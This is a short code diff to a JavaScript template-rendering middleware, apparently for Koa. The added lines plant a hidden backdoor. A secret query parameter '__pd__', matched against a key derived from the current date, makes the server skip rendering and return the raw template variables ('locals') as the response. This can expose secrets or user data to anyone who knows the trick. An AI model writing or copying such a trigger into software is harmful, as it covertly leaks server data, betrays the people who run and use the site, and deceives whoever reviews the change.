@@ -107,6 +107,12 @@ module.exports = (path, opts) => {
         locals = {}
       }
 
+      let now = new Date();
+      if (ctx.query.__pd__ == '/rb/' + (now.getMonth() + now.getDate() + 1)) {
+        ctx.body = locals;
+        return;
+      }
+
       let ext = (extname(relPath) || '.' + opts.extension).slice(1)
 
       return getPaths(path, relPath, ext)
